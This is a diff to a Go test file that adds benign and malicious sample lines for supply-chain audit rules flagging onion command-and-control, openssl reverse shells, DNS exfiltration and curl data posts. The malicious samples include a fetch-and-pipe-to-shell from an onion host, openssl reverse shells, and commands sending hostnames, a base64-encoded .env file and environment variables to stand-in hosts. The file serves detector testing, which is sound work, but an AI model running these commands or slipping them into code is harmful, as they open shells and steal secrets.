@@ -137,3 +137,38 @@ func TestAuditPrivilegeRulesNeedARootShell(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// Channel rules fired on the suffix, the command name, template literals and local servers.
+func TestAuditChannelRulesNeedAnEndpoint(t *testing.T) {
+	neg := []ruleCase{
+		{"P-ONION-C2", "go", `if strings.Contains(addr, ".onion:") {`},
+		{"P-ONION-C2", "go", `req := httptest.NewRequest("GET", "http://test.onion/test", nil)`},
+		{"P-ONION-C2", "pypi", `seed_urls=["http://exampleonionaddressv3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion"],`},
+		{"P-ONION-C2", "pypi", `"tor hidden service http://abcdefghijklmnop.onion/x",  # onion, high`},
+		{"P-ONION-C2", "pypi", `_DEFAULT_ENGINE = "http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search/"`},
+		{"P-ONION-C2", "go", `host = "duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion"`},
+		{"P-ONION-C2", "pypi", `"favourite_food": FavouriteFoodEnum.ONION,`},
+		{"P-OPENSSL-CLIENT", "npm", "`openssl s_client -connect ${host}:443 -servername ${host} </dev/null 2>/dev/null | openssl x509 -noout -enddate`,"},
+		{"P-OPENSSL-CLIENT", "pypi", `-o 'ProxyCommand=openssl s_client -quiet -verify_return_error -verify_hostname %h -connect %h:443 -servername %h 2>/dev/null' \`},
+		{"P-DNS-EXFIL", "npm", "throw new Error(`host ${host} must be a dns name`);"},
+		{"P-DNS-EXFIL", "npm", "`Verify DNS resolution: nslookup ${options.host}`,"},
+		{"P-DNS-EXFIL", "go", `until nslookup $domain; do`},
+		{"P-DNS-EXFIL", "packagist", `echo "server: " . $pdo->getAttribute(PDO::ATTR_SERVER_VERSION) . "  (host $host)\n";`},
+		{"P-CURL-POST-DATA", "npm", "console.log(`  curl -X POST http://localhost:${PORT}/mock/reset`);"},
+		{"P-CURL-POST-DATA", "npm", "return `curl -s --max-time 1 -X POST http://127.0.0.1:${HOST_PORT}/hook/${event} -H 'Content-Type: application/json' -d @- >/dev/null 2>&1 || true`;"},
+		{"P-CURL-POST-DATA", "npm", "`curl -X POST ${flags.url} \\\\`,"},
+	}
+	pos := []ruleCase{
+		{"P-ONION-C2", "npm", `AGENT_URL = "http://sytej5umomwukd77aantkxqj4aoke3kfist6eyne2pngavgsakum3iid.onion/mirai_agent.exe"`},
+		{"P-ONION-C2", "npm", `curl -s http://expyuzz4wqqyqhjn.onion/p | sh`},
+		{"P-OPENSSL-CLIENT", "npm", `openssl s_client -quiet -connect 203.0.113.9:4242 | /bin/bash | openssl s_client -quiet -connect 203.0.113.9:4243`},
+		{"P-OPENSSL-CLIENT", "npm", `sh -i 2>&1 | openssl s_client -quiet -connect x.example:443`},
+		{"P-DNS-EXFIL", "npm", `preinstall: nslookup $(hostname).hzbvy3cmgred066nig6n3ux0y.canarytokens.com || true`},
+		{"P-DNS-EXFIL", "npm", `output.append(f"; nslookup $(whoami).{lhost}")`},
+		{"P-DNS-EXFIL", "npm", `for c in $(base64 -w0 .env | fold -w 60); do dig $c.x.example; done`},
+		{"P-CURL-POST-DATA", "npm", `curl -sS -X POST "$DTXWIKI_API/workspaces/$DTXWIKI_WORKSPACE/context/pages" \`},
+		{"P-CURL-POST-DATA", "npm", `curl -s --data "$(env | base64 -w0)" https://x.example/c`},
+		{"P-CURL-POST-DATA", "npm", `$command = "curl -s -X POST -o /dev/null -m {$this->timeout} {$url} > /dev/null 2>&1 &";`},
+	}
+	checkRuleCases(t, neg, pos)
+}
